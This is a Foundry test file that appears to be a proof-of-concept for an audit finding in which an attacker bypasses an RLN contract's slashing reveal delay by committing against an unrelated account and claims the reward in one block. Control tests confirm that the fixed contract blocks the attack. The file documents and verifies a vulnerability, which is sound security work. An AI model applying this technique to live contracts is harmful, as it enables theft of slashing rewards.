// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    RLN,
    RLNFixed,
    MiniToken,
    MiniPoseidon,
    MiniKarma
} from "./65326-anyone-can-dodge-reveal-delays-by-providing-unrelated-accoun.sol";

contract RLNRevealDelayDodgeTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_unrelatedAccount_dodgesRevealDelay_claimsReward() public {
        Exploit e = new Exploit();

        MiniToken reward = MiniToken(e.rewardTokenAddr());
        assertEq(reward.balanceOf(ATTACKER), 0, "attacker starts with no reward");

        e.run();

        uint256 rewardAmount = e.reward();

        // The attacker claimed the full slashing reward in a single block, with
        // zero enforced wait, by committing against an unrelated unused account.
        assertEq(e.attackerReward(), rewardAmount, "attacker received the slash reward");
        assertEq(reward.balanceOf(ATTACKER), rewardAmount, "reward token landed at ATTACKER");
        assertGt(reward.balanceOf(ATTACKER), 0, "attacker profited from dodging the delay");

        // Negative control A: the legitimate queue (committing against the TRUE
        // account) forces a delay, so a same-block reveal reverts. This is the
        // protection the attacker bypassed.
        assertTrue(e.blockedViaTrueAccount(), "true-account reveal must be delay-queued");

        // Negative control B: the fixed contract (account bound to member) reverts
        // the identical unrelated-account reveal, proving the bug is causal.
        assertTrue(e.fixedBlockedExploit(), "fixed contract must block the exploit");
    }

    function test_control_fixedContract_paysAttackerNothing() public {
        // Rebuild the scenario directly against the fixed contract and confirm the
        // unrelated-account reveal reverts and pays the attacker nothing.
        MiniToken reward = new MiniToken("Slash Reward", "SLASH-REWARD");
        MiniPoseidon poseidon = new MiniPoseidon();
        uint256 rewardAmount = 1 ether;
        MiniKarma karma = new MiniKarma(address(reward), rewardAmount);
        RLNFixed rlnFixed = new RLNFixed(address(poseidon), address(karma), 1 hours);

        bytes32 pk = keccak256("rln-victim-private-key");
        address bob = address(uint160(0xB0B0));
        address random = address(uint160(0xBEEF));

        uint256 idc = poseidon.hash(uint256(pk));
        rlnFixed.register(idc, bob);
        rlnFixed.grantSlasher(address(this));

        bytes32 attackerHash = keccak256(abi.encodePacked(pk, ATTACKER));
        rlnFixed.slashCommit(random, attackerHash);

        vm.expectRevert(RLNFixed.RLN__InvalidCommitment.selector);
        rlnFixed.slashReveal(random, pk, ATTACKER);

        assertEq(reward.balanceOf(ATTACKER), 0, "fixed contract pays attacker nothing");
    }

    function test_control_vulnerable_trueAccountRevealIsDelayed() public {
        // Directly demonstrate the delay the bug dodges: on the vulnerable
        // contract, committing against the true (already-used) account queues the
        // reveal into the future, so an immediate reveal reverts.
        MiniToken reward = new MiniToken("Slash Reward", "SLASH-REWARD");
        MiniPoseidon poseidon = new MiniPoseidon();
        MiniKarma karma = new MiniKarma(address(reward), 1 ether);
        RLN rln = new RLN(address(poseidon), address(karma), 1 hours);

        bytes32 pk = keccak256("rln-victim-private-key");
        address bob = address(uint160(0xB0B0));
        address honest = address(uint160(0xA5A5));

        uint256 idc = poseidon.hash(uint256(pk));
        rln.register(idc, bob);
        rln.grantSlasher(address(this));

        // honest slasher takes the queue slot on the true account
        rln.slashCommit(bob, keccak256(abi.encodePacked(pk, honest)));
        // attacker committing against the same true account is queued behind it
        rln.slashCommit(bob, keccak256(abi.encodePacked(pk, ATTACKER)));

        vm.expectRevert(RLN.RLN__RevealWindowNotStarted.selector);
        rln.slashReveal(bob, pk, ATTACKER);
    }
}
